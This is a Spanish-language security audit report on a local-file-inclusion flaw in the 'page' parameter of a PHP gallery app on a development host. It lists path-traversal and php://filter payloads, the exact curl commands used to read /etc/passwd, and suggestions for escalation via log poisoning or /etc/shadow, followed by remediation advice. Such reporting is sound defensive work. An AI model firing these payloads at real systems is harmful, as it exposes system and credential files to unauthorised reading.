# Informe LFI — Galería de Arte Virtual

Fecha: 2026-04-27T15:55:36Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo:
Se identificó y explotó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro "page" de gallery.php, permitiendo la lectura de /etc/passwd. Se confirmó acceso a ficheros sensibles de la aplicación y del sistema.

Detalles técnicos:
- URL vulnerable: http://web.dev.local:8081/gallery.php?page=
- Parámetro vulnerable: page

Comandos y payloads utilizados (reconstruidos):
1) Reconocimiento manual (curl loop):
   - Se probaron parámetros comunes: file, page, include, path, template, view, lang, doc, load, root, p, q, uri, file_path
   - Payloads de traversal:
     ../../../../../../../../etc/passwd
     ../../../../../../../../etc/hosts
   - Wrappers php://filter:
     php://filter/read=convert.base64-encode/resource=../../../../../../../../etc/passwd

2) Prueba dirigida contra gallery.php (comandos exactos ejecutados):
   curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../../../etc/passwd"
   curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../../../../../etc/passwd"

Evidencia obtenida:
- Respuesta HTTP contenía el contenido de /etc/passwd en la sección principal de la página cuando se inyectó el payload de traversal en el parámetro page.
  Ejemplo (fragmento):
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

Impacto:
- Lectura de ficheros sensibles del sistema (información de usuarios) — evidencia de LFI confirmada.
- Desde LFI se pueden realizar técnicas adicionales (php://filter para leer código fuente PHP, acceso a logs para log poisoning, intento de lectura de /etc/shadow si los permisos lo permiten).

Recomendaciones:
1. Sanitizar/validar parámetros que controlan inclusiones de ficheros (permitir solo valores esperados mediante whitelist, no usar entradas del usuario directamente en include/require).
2. Evitar usos de include/require con rutas relativas proporcionadas por el usuario; usar mapeos internos.
3. Deshabilitar wrappers peligrosos si no son necesarios y restringir allow_url_include en php.ini.
4. Revisar logs para detectar abuso y rotar credenciales si se sospecha exfiltración adicional.

Comandos y archivos generados durante la auditoría:
- /app/reports/lfi_scan_output.txt (resultado del barrido por parámetros)
- /app/reports/gallery_probe.txt (respuesta de gallery.php con payloads)

Fin del informe.
